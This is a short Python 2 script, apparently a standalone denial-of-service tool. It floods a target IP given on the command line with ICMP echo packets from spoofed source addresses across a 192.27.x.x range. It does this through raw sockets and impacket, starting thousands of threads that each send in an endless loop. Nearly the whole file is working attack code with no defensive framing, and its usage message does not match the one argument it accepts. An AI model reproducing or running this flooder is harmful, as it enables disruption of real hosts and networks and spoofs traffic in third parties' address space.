#!/usr/bin/env python

import socket
import struct
import sys
import time
import thread
from impacket import ImpactDecoder, ImpactPacket

# target_ip: Destination IP to be flooded

if len(sys.argv) == 2 :
        target_ip = sys.argv[1]
else: #incorrect values, print help
        print "Usage: %s victim_IP target_IP \n   eg: %s 192.168.1.0 192.24.31.1" % (sys.argv[0],sys.argv[0])
        exit(1)

print "Attempting dos attack on %s(Target IP) " % (target_ip)

def flood(src, dst):
	# create packet
	ip = ImpactPacket.IP()
	ip.set_ip_src(src)
	ip.set_ip_dst(dst)

	icmp = ImpactPacket.ICMP()
	icmp.set_icmp_type(icmp.ICMP_ECHO)
	 
	# Include a 156-character long payload inside the ICMP packet.
	icmp.contains(ImpactPacket.Data("A"*156))
	 
	# Have the IP packet contain the ICMP packet (along with its payload).
	ip.contains(icmp)

	seq_id = 0
	while 1:
		# Give the ICMP packet the next ID in the sequence.
		seq_id += 1
		icmp.set_icmp_id(seq_id)
		# Calculate its checksum.
		icmp.set_icmp_cksum(0)
		icmp.auto_checksum = 1            
	   # send packet
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		# Send it to the target host.
		s.sendto(ip.get_packet(), (dst, 0))
		print "sent from %s of sid: %d" % (src,seq_id)
		continue

for j in range(256):
	src1 = "192.27." + str(j)
	for i in range(256):
	        src = src1 + "." + str(i)
	        thread.start_new_thread(flood, (src, target_ip))
	        time.sleep(0.2)